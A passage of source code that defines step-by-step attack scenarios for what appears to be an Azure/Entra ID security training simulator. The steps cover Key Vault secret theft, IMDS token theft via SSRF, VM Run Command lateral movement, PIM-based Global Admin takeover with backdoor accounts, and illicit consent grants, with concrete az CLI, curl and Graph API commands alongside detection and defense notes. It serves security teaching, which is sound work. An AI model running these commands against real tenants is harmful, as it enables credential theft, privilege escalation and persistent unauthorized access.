    logMessage: "Control-plane enumeration: GET https://management.azure.com/subscriptions/{subId}/providers/Microsoft.KeyVault/vaults?api-version=2026-02-01 lists vault names, locations, tenant IDs, RBAC mode, network ACLs, and soft-delete/purge-protection settings visible to this principal.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "List vaults"),
  },
  {
    logMessage: "Authorization split: Key Vault control plane is managed through Azure Resource Manager. Key Vault data plane uses https://<vault>.vault.azure.net for secrets, keys, and certificates. Being able to manage the vault object is not the same as being able to read secret values unless RBAC or access-policy design creates that bridge.",
    logType: "info",
    action: () => highlightElement("ent_kv"),
  },
  {
    logMessage: "Data-plane discovery: GET https://sintra-key.vault.azure.net/secrets?api-version=7.6 lists secret names and versions if the attacker has Key Vault Secrets User, Key Vault Secrets Officer, Key Vault Administrator, or equivalent legacy secret list permission.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "GET /secrets"),
  },
  {
    logMessage: "Secret theft: GET https://sintra-key.vault.azure.net/secrets/db-password/{version}?api-version=7.6 returns the plaintext secret value. Key Vault Reader can read metadata only; it cannot read sensitive secret contents. Key Vault Secrets User can read secret values.",
    logType: "azurerm",
    action: () => { highlightElement("ent_kv", undefined, "compromised"); addTemporaryEdge("ent_kv", "ent_attacker", "azurerm", "secret value"); },
  },
  {
    logMessage: "Key and certificate impact: keys can be listed and used for permitted crypto operations, but private key material is generally not exported unless the key/certificate type and permissions allow export or backup. Certificates may expose secret-backed PFX material when the principal can read the associated secret.",
    logType: "info",
    action: () => highlightElement("ent_kv"),
  },
  {
    logMessage: "Modern Azure RBAC persistence: if the attacker has Owner, User Access Administrator, or Key Vault Data Access Administrator at the right scope, they create a role assignment for an attacker principal: Key Vault Secrets User for read access, or Key Vault Administrator for broad data-plane control.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "azurerm", "roleAssignments/write"),
  },
  {
    logMessage: "Legacy access-policy pivot: if the vault uses the access policy permission model and the attacker has Microsoft.KeyVault/vaults/write through Contributor, Key Vault Contributor, or a custom role, they can set a vault access policy granting themselves get/list secrets. This is why Microsoft recommends Azure RBAC over legacy access policies.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "set access policy"),
  },
  {
    logMessage: "Identity scope warning: check not only users but also service principals, managed identities, automation accounts, and deployment agents. Cloud workloads often hold the real Key Vault path, and a compromised workload identity may have cleaner data-plane access than the initially compromised user.",
    logType: "info",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_mi"); },
  },
  {
    logMessage: "Detection: enable Key Vault diagnostic logging to Log Analytics or a SIEM. Monitor SecretList, SecretGet, KeyList, CertificateGet, vaults/write, access policy changes, roleAssignments/write, unusual caller IPs, and sudden access by principals that never touched the vault before.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Key Vault compromise turns Azure resource access into credential theft: database passwords, API keys, signing certificates, storage credentials, SSH keys, and app secrets. The blast radius depends on whether the attacker only reads one vault or can grant themselves durable RBAC/access-policy permissions.",
    logType: "success",
    action: () => { highlightElement("ent_kv"); highlightElement("ent_attacker"); },
  },
];

// ── 9c. User Administrator → Password Reset → Azure RBAC Pivot ─────────────
export const entraUserAdminPasswordResetRbacScenario = [
  {
    scenarioName: "Attack: User Administrator Password Reset → Azure RBAC Pivot",
    logMessage: "Attacker Goal: Abuse a compromised User Administrator account to reset a lower-privileged user's password, sign in as that user, and use the target user's Azure RBAC User Access Administrator rights to grant Key Vault access.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Scope guardrail: User Administrator can reset passwords for non-admin users and a subset of limited admin roles, but cannot reset Global Administrators or Privileged Role Administrators. The Azure resource pivot depends entirely on the reset target holding Azure RBAC rights (User Access Administrator or Owner) at subscription, resource group, or vault scope.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Prerequisite: Attacker has Cole's compromised session. Cole is User Administrator in Entra ID, but has no access to the Sintra subscription or its Key Vault. Bob is a normal cloud user with Azure RBAC User Access Administrator on the resource group containing Key Vault.",
    logType: "setup",
    action: () => { highlightElement("ent_admin", undefined, "compromised"); highlightElement("ent_user2"); highlightElement("ent_kv"); },
  },
  {
    logMessage: "Recon: AzureHound / Graph shows Cole can reset Bob's password, and Azure RBAC data shows Bob has roleAssignments/write through User Access Administrator on the resource group. Global Admin targets are absent from this reset path because User Administrator cannot reset them.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Find reset -> UAA path"),
  },
  {
    logMessage: "Attacker resets Bob's password: PATCH /v1.0/users/{bobId} { passwordProfile: { forceChangePasswordNextSignIn: true, password: '<temporaryPassword>' } }. Portal reset normally generates a temporary password; Graph/CLI-style updates can set one when authorized.",
    logType: "msgraph",
    action: () => { highlightElement("ent_user2", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Reset Bob password"); },
  },
  {
    logMessage: "Attacker signs in as Bob and completes the forced password-change step. This works in the lab because Bob has no strong MFA requirement or the attacker can satisfy the registered method. In a hardened tenant, MFA, sign-in risk, and password reset alerts can break the chain here.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "Bob session"),
  },
  {
    logMessage: "As Bob, attacker lists Azure resource groups: GET https://management.azure.com/subscriptions/{subId}/resourcegroups?api-version=2021-04-01. Bob can see the target resource group because his Azure RBAC assignment is scoped there.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "List target RG"),
  },
  {
    logMessage: "Modern Key Vault RBAC path: attacker creates a role assignment for Cole or an attacker-controlled principal at the vault or resource-group scope. PUT /providers/Microsoft.Authorization/roleAssignments/{guid} grants 'Key Vault Secrets User' or 'Key Vault Administrator'. This requires User Access Administrator, Owner, or equivalent roleAssignments/write.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "Grant KV data role"),
  },
  {
    logMessage: "Legacy Key Vault access-policy path: if the vault still uses the access policy permission model and Bob has Microsoft.KeyVault/vaults/write, attacker can run az keyvault set-policy to grant secret permissions. Microsoft now recommends Azure RBAC because access policies let Contributor-style roles self-grant data-plane access.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "set-policy (legacy)"),
  },
  {
    logMessage: "Attacker switches back to Cole or the attacker principal and reads secrets: GET https://corp-kv.vault.azure.net/secrets?api-version=2025-07-01. The directory role did not directly read Key Vault; it enabled takeover of an Azure RBAC delegate who could grant access.",
    logType: "azurerm",
    action: () => { highlightElement("ent_kv", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "Read secrets"); },
  },
  {
    logMessage: "Detection: Correlate Entra audit event 'Reset user password' by a User Administrator, interactive sign-in as the reset user from a new location, Azure Activity Log Microsoft.Authorization/roleAssignments/write, and Key Vault SecretGet/List operations shortly afterward.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: A helpdesk-style directory role becomes Azure resource access when ordinary users hold powerful Azure RBAC roles. Mitigate with PIM for Azure roles, phishing-resistant MFA for RBAC delegates, alerts on admin password resets, and removal of standing User Access Administrator at broad scopes.",
    logType: "success",
    action: () => { highlightElement("ent_user2"); highlightElement("ent_kv"); },
  },
];

// ── 9a. ARM Deployment History Credential Hunting ────────────────
export const entraDeploymentHistoryCredHuntScenario = [
  {
    scenarioName: "Attack: ARM Deployment History Credential Hunting",
    logMessage: "Attacker Goal: With Reader-level access to a resource group, enumerate all ARM deployment history to find plaintext credentials, admin usernames, and sensitive configuration values embedded in templates and parameters — including resources that have since been deleted.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has any Azure RBAC role on the resource group (Reader or above). No elevated permissions required. Deployment history is readable by all role holders — it is not a privileged operation. Applicable immediately after any initial access foothold.",
    logType: "setup",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_tenant"); },
  },
  {
    logMessage: "Enumerate all deployments: az deployment group list --resource-group <rg> --output table. Returns up to 800 entries per resource group (oldest auto-pruned). All deployments appear — including those for resources that have since been deleted. Failed and cancelled deployments are especially valuable: they may contain misconfigured templates where admins accidentally included credentials.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "azurerm", "ListDeployments (Reader)"),
  },
  {
    logMessage: "Inspect deployment parameters: az deployment group show --resource-group <rg> --name <deploymentName> --query 'properties.parameters'. Parameters marked secureString are redacted from history. All other parameter types are stored and returned in plaintext — including administrator passwords, database connection strings, and API keys passed as plain strings.",
    logType: "azurerm",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Inspect deployment templates: az deployment group show --resource-group <rg> --name <deploymentName> --query 'properties.template'. Full ARM/Bicep template returned — reveals resource configurations, hardcoded secrets in resource properties, and any tags containing credentials. Failed Cosmos DB deployment example: template tag 'azureuser': 'password123!' exposed in plaintext because tag properties are not secureString-typed.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "azurerm", "template → plaintext creds"),
  },
  {
    logMessage: "Programmatic harvest: REST API GET /subscriptions/{subId}/resourcegroups/{rg}/providers/Microsoft.Resources/deployments?$top=800 → iterate all deployments, extract properties.parameters and properties.template. Grep output for patterns: password, secret, apiKey, connectionString, adminPassword, sshKey. Automate with PowerShell + ConvertFrom-Json or Python + json parsing.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); addTemporaryEdge("ent_attacker", "ent_tenant", "azurerm", "bulk deployment harvest"); },
  },
  {
    logMessage: "No audit trail on read: Azure Activity Log records deployment creation/update events (Microsoft.Resources/deployments/write) but does NOT log read access (GET on deployment history). Attacker can silently iterate all 800 deployment entries. Only the initial Entra ID sign-in is visible in sign-in logs.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DETECTION: No native alert for deployment history read. Defender for Cloud can flag exposed credentials via pattern matching in templates at creation time. Azure Policy / PSRule 'Azure.Deployment.SecureParameter' rule detects non-secureString sensitive parameters at deployment-time. Post-compromise detection relies on downstream use of harvested credentials — watch for new sign-ins from unfamiliar locations with accounts discovered in templates.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: Enforce secureString (ARM) / @secure() decorator (Bicep) for all password, key, and secret parameters — values are excluded from deployment history and outputs. Azure Policy deny effect blocks deployments with known-sensitive parameter names that lack secureString type. Regularly purge deployment history. Scope Reader role to minimum required resource groups.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Silent credential harvest with Reader access — no alerts, no log entries. Yields credentials for accounts and resources that may no longer exist in the portal but whose passwords are still reused elsewhere. Deleted resources leave their deployment history behind indefinitely (up to the 800-entry cap). High-value output: database admin passwords, VM local credentials, storage account keys, API tokens.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_tenant"); },
  },
];

// ── 9b. Managed Identity Abuse (Over-Privileged MI → Key Vault Secret Extraction) ──
export const entraManagedIdentityAbuseScenario = [
  {
    scenarioName: "Attack: Over-Privileged Managed Identity Abuse (VM → Key Vault Secret Extraction)",
    logMessage: "Attacker Goal: After gaining code execution on an Azure VM, authenticate as its over-privileged system-assigned Managed Identity, escalate Key Vault data-plane access, and exfiltrate plaintext secrets — no credentials required.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has code execution (SSH/RDP/RCE) on ent_svc — a Linux VM with a system-assigned Managed Identity. Azure AD / BloodHound analysis shows the MI has Owner role at subscription scope: full control over all resource groups and resources, including Key Vaults.",
    logType: "setup",
    action: () => { highlightElement("ent_svc", stepDelay, "compromised"); highlightElement("ent_mi"); },
  },
  {
    logMessage: "System-assigned MI: az login --identity (no credentials, no object ID needed — one MI per system-assigned VM). User-assigned MI: az login --identity -u <principalId>. The Azure CLI queries IMDS internally (http://169.254.169.254/metadata/identity/oauth2/token) and caches ARM-scoped tokens. Attacker is now operating as the MI.",
    logType: "imds",
    action: () => addTemporaryEdge("ent_svc", "ent_mi", "imds", "az login --identity"),
  },
  {
    logMessage: "Enumerate Key Vaults: az keyvault list --output table. All Key Vaults visible to the subscription-owner MI are returned. BloodHound path: MI → Owner (subscription) → Key Vault resource. Target: 'SintraKey' vault.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_mi", "ent_kv", "azurerm", "az keyvault list"),
  },
  {
    logMessage: "az keyvault secret list --vault-name SintraKey → FORBIDDEN. Key Vault data-plane access requires separate authorization from control-plane RBAC. Owner at subscription scope does not automatically grant data-plane read on secrets — Key Vault enforces its own permission model.",
    logType: "info",
    action: () => highlightElement("ent_kv"),
  },
  {
    logMessage: "Permission model fork — attacker identifies which model the vault uses. Legacy Access Policy vaults: az keyvault set-policy --name SintraKey --object-id <MI-objectId> --secret-permissions get list — grants MI data-plane secret read. Control-plane Owner enables this call. Azure RBAC vaults (default since API v2026-02-01): az keyvault set-policy is rejected; attacker uses az role assignment create instead.",
    logType: "attack",
    action: () => highlightElement("ent_kv"),
  },
  {
    logMessage: "RBAC vault path (2026 default): az role assignment create --assignee <MI-objectId> --role 'Key Vault Secrets User' --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/SintraKey. Owner role grants Microsoft.Authorization/roleAssignments/write — attacker self-assigns the data-plane reader role.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_mi", "ent_kv", "azurerm", "role assignment create (KV Secrets User)"),
  },
  {
    logMessage: "List secrets: az keyvault secret list --vault-name SintraKey → [{ id: '.../secrets/secret-thing', ... }]. Read plaintext value: az keyvault secret show --name secret-thing --vault-name SintraKey → { value: 'meow meow' }. Secrets exfiltrated with zero network noise — all via authenticated Azure CLI calls.",
    logType: "attack",
    action: () => { highlightElement("ent_kv", stepDelay, "compromised"); addTemporaryEdge("ent_mi", "ent_kv", "azurerm", "secret show → plaintext"); },
  },
  {
    logMessage: "DETECTION: Azure Activity Log — Microsoft.Authorization/roleAssignments/write where caller principal matches a Managed Identity and scope contains 'Microsoft.KeyVault'. Microsoft.KeyVault/vaults/accessPolicies/write for legacy path. Alert on unexpected MI-sourced role assignments. Key Vault diagnostic logs capture GetSecret operations per secret name and caller identity. Defender for Cloud: 'Unusual access to Key Vault' alert on first access from VM identity.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: Never assign Owner or Contributor at subscription scope to a Managed Identity — scope to minimum resource group and use custom RBAC roles. For Key Vault: enable 'Azure RBAC' permission model (now default on new vaults, API v2026-02-01), restrict with Key Vault Firewall to known VNet subnets, enable Purge Protection, and audit role assignments on vault scope in SIEM. Deny Microsoft.Authorization/roleAssignments/write via Azure Policy for non-privileged identities.",
    logType: "info",
    action: () => highlightElement("ent_mi"),
  },
  {
    logMessage: "IMPACT: No credentials, no exploitation — just az login --identity and one role assignment. Owner at subscription scope is a wildcard; single over-privileged MI on any VM in the subscription collapses the entire secret store. System-assigned MI inherits full power of every subscription resource in its scope.",
    logType: "attack",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_kv"); highlightElement("ent_mi"); },
  },
];

// ── 10. IMDS Credential Theft ─────────────────────────────────────
export const entraIMDSCredTheftScenario = [
  {
    scenarioName: "Attack: IMDS Credential Theft via SSRF / RCE on Azure Workload",
    logMessage: "Attacker Goal: Exploit SSRF or RCE on an Azure-hosted workload to query the Instance Metadata Service (IMDS) and steal the Managed Identity token — lateral movement to Azure resources via Azure RBAC.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has achieved SSRF or RCE on the Azure workload hosting AppReg-01 / WebApp-MI (ent_svc). The workload has system-assigned Managed Identity (ent_mi) with 'Key Vault Secrets User' role on corp-kv and 'Reader' on subscription.",
    logType: "setup",
    action: () => { highlightElement("ent_svc", stepDelay, "compromised"); highlightElement("ent_mi"); },
  },
  {
    logMessage: "Attacker (via SSRF/RCE): curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/'. IMDS is link-local (169.254.x.x) — unreachable from internet, only from within the VM. No auth required.",
    logType: "imds",
    action: () => addTemporaryEdge("ent_svc", "ent_mi", "imds", "steal MI token (SSRF)"),
  },
  {
    logMessage: "IMDS → Attacker: 200 OK { access_token: 'eyJ0eXAiOiJKV1Q...', token_type: 'Bearer', expires_in: 3599, resource: 'https://vault.azure.net', client_id: <MI_clientId>, object_id: <MI_principalId>, expires_on: <unix_ts> }. Valid Bearer token for Key Vault data-plane.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_mi", "ent_attacker", "imds", "MI token (vault.azure.net)"),
  },
  {
    logMessage: "Attacker → Key Vault: GET https://corp-kv.vault.azure.net/secrets?api-version=2025-07-01 (Authorization: Bearer <MI_token>). Lists all secret names. Then GET /secrets/{name}/{version}?api-version=2025-07-01 for each one — retrieves plaintext values such as db-connstr, stripe-api-key, ssh-private-key, and mssql-sa-password.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "GET /secrets/* (MI token)"),
  },
  {
    logMessage: "Key Vault: Validates JWT — aud=vault.azure.net ✓, iss ✓, exp ✓. Azure RBAC: MI principal → 'Key Vault Secrets User' role on this vault ✓. All secrets returned. No password, no API key needed by attacker — just network access to IMDS endpoint.",
    logType: "attack",
    action: () => highlightElement("ent_kv", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker escalates: GET http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com. If MI has 'Contributor' or 'Reader' on subscription — GET /subscriptions/{subId}/resources → enumerate all Azure resources.",
    logType: "imds",
    action: () => addTemporaryEdge("ent_svc", "ent_mi", "imds", "ARM token req"),
  },
  {
    logMessage: "Attacker → Azure ARM: GET https://management.azure.com/subscriptions/{subId}/resources?api-version=2023-07-01 (MI ARM token). Returns all VMs, storage accounts, databases, container registries, AKS clusters — full subscription inventory for further lateral movement.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "ARM /subscriptions enum"),
  },
  {
    logMessage: "DETECTION: Azure Defender for Key Vault: 'Unusual access to Key Vault' alert on first IMDS-sourced access from new IP. Azure Monitor: KV diagnostic logs → Log Analytics: alert on secret read spike. Defense: scope MI role to specific secret names (not entire vault), enable 'Key Vault firewall' restricting to known subnets.",
    logType: "info",
    action: () => highlightElement("ent_mi"),
  },
  {
    logMessage: "IMPACT: SSRF to IMDS is the Azure equivalent of LSASS credential theft on-prem. MI tokens continuously available from IMDS — no expiry friction (renewed automatically). Over-privileged MI is the most common Azure misconfiguration in cloud IR cases. Compromise of one workload cascades to full subscription via unconstrained MI role assignments.",
    logType: "attack",
    action: () => { highlightElement("ent_kv"); highlightElement("ent_mi"); },
  },
];

// ── 10b. Azure VM Run Command Abuse (Lateral Movement via Managed Identity) ──
export const entraVMRunCommandAbuseScenario = [
  {
    scenarioName: "Attack: Azure VM Run Command Abuse (Managed Identity → Lateral Movement)",
    logMessage: "Attacker Goal: After compromising a Linux VM with an over-privileged Managed Identity, use the Azure VM Run Command API to execute arbitrary commands on other VMs in the tenant — changing local credentials and achieving lateral movement without touching the network directly.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has code execution on ent_svc (a Linux VM). The VM's system-assigned Managed Identity has Contributor or Owner on a resource group containing additional Windows VMs. IMDS token already obtained (see IMDS Credential Theft scenario) or attacker is operating via Azure CLI authenticated via MI.",
    logType: "setup",
    action: () => { highlightElement("ent_svc", stepDelay, "compromised"); highlightElement("ent_mi"); },
  },
  {
    logMessage: "Attacker (on Linux VM): curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' → ARM-scoped MI token. Authenticate Azure CLI: az login --identity. Now operating as the Managed Identity against Azure Resource Manager.",
    logType: "imds",
    action: () => addTemporaryEdge("ent_svc", "ent_mi", "imds", "ARM MI token"),
  },
  {
    logMessage: "Enumerate accessible VMs: az vm list --resource-group <rg> --output table. BloodHound/AzureHound analysis maps: Managed Identity → Contributor on resource group → Owner access over all VMs in group. Identifies Windows VM 'windows-vm' as lateral movement target.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_mi", "ent_tenant", "azurerm", "VM enumeration"),
  },
  {
    logMessage: "Remote command execution via Run Command v1: az vm run-command invoke -g <rg> -n windows-vm --command-id RunPowerShellScript --scripts 'ipconfig' — executes as SYSTEM on the target VM. Output returned in ARM API response. No network path to target VM required — all via Azure control plane.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_mi", "ent_dev1", "azurerm", "RunCommand → SYSTEM exec"),
  },
  {
    logMessage: "Enumerate local users: --scripts 'Get-LocalUser' → returns local account list including 'azureuser'. Run Command executes as NT AUTHORITY\\SYSTEM — highest local privilege. Arbitrary PowerShell: install backdoors, exfil secrets, disable AV, create new admin accounts.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "Password reset via ARM: az vm user update -g <rg> -n windows-vm --username azureuser --password 'Attacker@2024!'. ARM dispatches an Azure VM Agent extension to set the local account password. Attacker now knows azureuser credentials without extracting them from memory.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_mi", "ent_dev1", "azurerm", "az vm user update (password reset)"),
  },
  {
    logMessage: "Attacker RDPs into windows-vm using azureuser / 'Attacker@2024!' from public IP (if RDP NSG rule permits) or via Azure Bastion. Full interactive session on Windows VM — lateral movement complete from Linux VM via Azure control plane, no direct network path used.",
    logType: "attack",
    action: () => { highlightElement("ent_dev1", stepDelay, "compromised"); addTemporaryEdge("ent_attacker", "ent_dev1", "http", "RDP (new password)"); },
  },
  {
    logMessage: "Run Command v2 (Managed RunCommand): POST /subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommands — persistent ARM resource with same SYSTEM execution context. Requires Microsoft.Compute/virtualMachines/runCommand/write. Identical attack capability to v1.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DETECTION (2026): Activity Log events — Microsoft.Compute/virtualMachines/runCommand/action with caller = Managed Identity principal. az vm user update generates Microsoft.Compute/virtualMachines/extensions/write. DCR logging change (March 2026): endpoint telemetry shifted to Azure Monitor Agent + Data Collection Rules — if DCR associations are removed (Microsoft.Insights/dataCollectionRuleAssociations/delete), downstream VM process/network logs may be suppressed. Monitor DCR deletion events alongside RunCommand activity.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: Scope Managed Identity roles using custom RBAC — remove Owner/Contributor from shared resource groups; grant only the minimum ARM actions needed. Block RunCommand at policy level: Azure Policy deny effect on Microsoft.Compute/virtualMachines/runCommand/action for non-admin principals. Enforce JIT VM access via Defender for Cloud to require approval for RDP/SSH. Alert on MI-sourced RunCommand invocations in SIEM.",
    logType: "info",
    action: () => highlightElement("ent_mi"),
  },
  {
    logMessage: "IMPACT: Full lateral movement across all VMs in the managed identity's RBAC scope — no network connectivity to targets, no credential spray, no exploit. Control plane access replaces network-level lateral movement. Single over-privileged MI can compromise every VM in a resource group.",
    logType: "attack",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_dev1"); highlightElement("ent_mi"); },
  },
];

// ── 11. PIM Eligible Role Activation — Account Takeover → GA ─────
export const entraPIMTakeoverScenario = [
  {
    scenarioName: "Attack: PIM Takeover — Compromised Account → Global Admin Escalation",
    logMessage: "Attacker Goal: After compromising EntraAdmin's session, activate their PIM-eligible Global Administrator assignment to obtain tenant-wide GA privileges, then establish persistent backdoor before PIM window closes.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker holds EntraAdmin (ent_admin) session token (access_token + refresh_token) — obtained via MFA fatigue, AITM, or device code phishing. EntraAdmin has GlobalAdministrator PIM-eligible assignment. PIM policy: no approval required, MFA required, max duration 8h.",
    logType: "setup",
    action: () => highlightElement("ent_admin", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker → Microsoft Graph PIM API (as EntraAdmin): GET https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances?$filter=principalId eq '{adminObjectId}' and roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'&$expand=roleDefinition. Confirms: GlobalAdministrator eligible, maxActivationDuration: PT8H, approvalRequired: false.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET PIM eligible roles"),
  },
  {
    logMessage: "Attacker → Microsoft Graph PIM API: POST https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests { action: 'selfActivate', principalId: <adminObjectId>, roleDefinitionId: '62e90394-69f5-4237-9190-012177145e10', directoryScopeId: '/', justification: 'Routine maintenance INC-0042', scheduleInfo: { startDateTime: <now>, expiration: { type: 'afterDuration', duration: 'PT8H' } } }.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST PIM activate GA"),
  },
  {
    logMessage: "Entra PIM: approvalRequired=false ✓ (no approval gate). MFA required: yes — checks current session token for recent MFA claim. If attacker holds session from MFA fatigue/AITM (amr includes 'mfa', <1h old), MFA step-up satisfied from session context. No new push triggered.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "MFA claim accepted"),
  },
  {
    logMessage: "Entra PIM: GlobalAdministrator active for 8h. Audit log written: { actor: EntraAdmin, operation: 'Add member to role', role: GlobalAdministrator, timestamp }. Attacker's next access_token (refresh_token exchange) includes 'wids': ['62e90394-...'] claim.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "GA wids token (8h)"),
  },
  {
    logMessage: "Attacker (Global Admin, 8h window): POST /v1.0/users → creates backdoor account 'svc-monitoring@corp.onmicrosoft.com' with strong password + MFA registered on attacker device. POST /v1.0/roleManagement/directory/roleAssignments → assigns GlobalAdministrator (standing, NOT PIM) to new account.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "create standing GA backdoor"),
  },
  {
    logMessage: "Attacker: Also adds client secret to highest-privilege app registration (AppReg-01) for fully autonomous, user-independent persistence. Two backdoors established within 4 minutes of GA activation.",
    logType: "attack",
    action: () => { highlightElement("ent_svc", stepDelay, "compromised"); highlightElement("ent_tenant"); },
  },
  {
    logMessage: "DETECTION: Entra Audit log correlation: PIM activation + new user creation + standing role assignment within same session = high-confidence incident. Microsoft Sentinel rule: 'PIM role activation followed by privileged operations (T1098.003)'. Fix: require approval for GA PIM activation — breaks entire chain.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: PIM without approval for Global Admin is operationally equivalent to standing GA. Attacker established standing GA backdoor account + SP credential backdoor within the 8h PIM window. Both persist after window closes, password reset on original admin, and all session revocations.",
    logType: "attack",
    action: () => highlightElement("ent_admin"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  PERSISTENCE & IMPACT
// ══════════════════════════════════════════════════════════════════

// ── 12. Illicit Consent Grant ─────────────────────────────────────
export const entraIllicitConsentScenario = [
  {
    scenarioName: "Attack: Illicit Consent Grant — Persistent High-Privilege App (Tenant-Wide)",
    logMessage: "Attacker Goal: Obtain persistent OAuth2 access to all tenant users' M365 data by registering a malicious multi-tenant app and harvesting consent grants — access survives password resets indefinitely.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker registers multi-tenant app in attacker Entra tenant (signInAudience: AzureADMultipleOrgs). Configured permissions: delegated Mail.Read, Files.ReadWrite.All, offline_access (user-consentable). Application: Mail.Read, User.Read.All (admin consent required). Publisher: not verified.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Wave 1 — User phishing: 340 users receive 'HR Self-Service portal' phish. Consent URL scope: Mail.Read+Files.ReadWrite.All+offline_access. Users approve — delegated grants created per user. Each generates a 90-day offline_access refresh_token for the attacker.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_user2"); },
  },
  {
    logMessage: "Alice consents → Entra ID creates oauth2PermissionGrant (consentType=Principal, principalId=alice). Auth code → attacker redirect_uri. POST /token → { access_token (Mail.Read, 1h), refresh_token (90d) }. Background job stores token keyed to alice@corp.",
    logType: "oidc",
    action: () => { addTemporaryEdge("ent_user1", "ent_tenant", "oidc", "user consent (alice)"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "alice token (90d)"); },
  },
  {
    logMessage: "Wave 2 — Admin phishing: EntraAdmin receives targeted phish for Application Permissions consent (admin-only). Approves → tenant-wide admin consent created (consentType=AllPrincipals). Application permission Mail.Read + User.Read.All granted for ALL users, not just admin.",
    logType: "oidc",
    action: () => { addTemporaryEdge("ent_admin", "ent_tenant", "oidc", "ADMIN consent (all users)"); highlightElement("ent_admin", stepDelay, "compromised"); },
  },
  {
    logMessage: "Attacker: POST /token { grant_type=client_credentials } with app secret → access_token with Mail.Read application permission (aud=graph.microsoft.com, roles=[Mail.Read, User.Read.All]). Can now read mail of ANY user without individual consent or refresh_token.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "app token (all users)"),
  },
  {
